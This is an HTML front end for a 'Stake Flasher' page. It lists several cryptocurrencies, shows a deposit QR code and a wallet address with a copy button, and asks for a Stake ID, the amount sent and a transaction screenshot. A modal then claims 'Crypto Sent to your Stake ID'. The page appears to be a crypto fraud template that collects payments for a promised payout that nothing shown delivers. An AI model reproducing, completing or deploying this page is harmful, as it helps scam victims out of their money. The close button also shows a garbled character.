<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Stake Flasher</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="container">
        <h1>Stake Flasher</h1>
        <div class="form-group">
            <label for="crypto">Select Cryptocurrency</label>
            <select id="crypto">
                <option value="btc">Bitcoin (BTC)</option>
                <option value="eth">Ethereum (ETH)</option>
                <option value="sol">Solana (SOL)</option>
                <option value="ltc">Litecoin (LTC)</option>
                <option value="doge">Dogecoin (DOGE)</option>
                <option value="trx">TRON (TRX)</option>
                <option value="usdt_bep20">USDT (BEP20)</option>
                <option value="usdt_erc20">USDT (ERC20)</option>
                <option value="usdt_trc20">USDT (TRC20)</option>
            </select>
        </div>
        <div class="qr-code">
            <img id="qr-image" src="btc.png" alt="QR Code">
        </div>
        <div class="form-group">
            <p id="wallet-address">YOUR_BTC_WALLET_ADDRESS</p>
            <button>Copy Address</button>
        </div>
        <div class="form-group">
            <label for="stake-id">Stake ID</label>
            <input type="text" id="stake-id" placeholder="Stake ID">
        </div>
        <div class="form-group">
            <label for="wallet-address-input">Wallet Address</label>
            <input type="text" id="wallet-address-input" placeholder="Enter your wallet address to receive funds">
        </div>
        <div class="form-group">
            <label for="amount">Amount Sent (USD)</label>
            <input type="number" id="amount" placeholder="Amount Sent (USD)">
            <p id="amount-message" class="amount-message"></p>
        </div>
        <div class="form-group">
            <label for="screenshot">Upload Transaction Screenshot</label>
            <input type="file" id="screenshot" accept="image/*">
        </div>
        <button class="submit-btn">Submit</button>
    </div>

    <div id="confirmationModal" class="modal">
        <div class="modal-content">
            <span class="close-button">Ã—</span>
            <div class="modal-icon">
                <img src="images/check_mark.png" alt="Checkmark"> 
            </div>
            <p>Crypto Sent to your Stake ID</p>
            <button id="modalOkButton">OK</button>
        </div>
    </div>

    <script src="script.js"></script>
</body>
</html>
